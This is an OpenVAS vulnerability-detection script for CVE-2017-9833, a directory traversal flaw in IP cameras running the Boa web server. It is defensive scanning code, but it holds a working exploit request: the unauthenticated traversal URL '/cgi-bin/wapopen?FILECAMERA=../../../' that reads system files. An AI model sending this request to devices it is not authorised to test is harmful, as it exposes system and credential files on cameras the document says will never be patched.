###############################################################################
# OpenVAS Vulnerability Test
#
# Multiple IP-Cameras Directory Traversal Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106907");
  script_version("2019-04-23T06:31:54+0000");
  script_tag(name:"last_modification", value:"2019-04-23 06:31:54 +0000 (Tue, 23 Apr 2019)");
  script_tag(name:"creation_date", value:"2017-06-26 14:23:36 +0700 (Mon, 26 Jun 2017)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2017-9833");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Multiple IP-Cameras Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Boa/banner");

  script_tag(name:"summary", value:"The IP-Camera is prone to a directory traversal vulnerability.");

  script_tag(name:"insight", value:"The scripts '/cgi-bin/wappwd' and '/cgi-bin/wapopen' are prone to a
  directory-traversal vulnerability because they fail to properly sanitize user-supplied input in the 'FILEFAIL'
  and 'FILECAMERA' parameters respectively.");

  script_tag(name:"impact", value:"An unauthenticated attacker can exploit this vulnerability to retrieve
  arbitrary files from the vulnerable system in the context of the affected application. Information obtained may
  aid in further attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://pastebin.com/raw/rt7LJvyF");
  script_xref(name:"URL", value:"http://www.oamk.fi/~jukkao/bugtraq/1104/0206.html");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default: 80);

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = "/cgi-bin/wapopen?FILECAMERA=../../../" + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);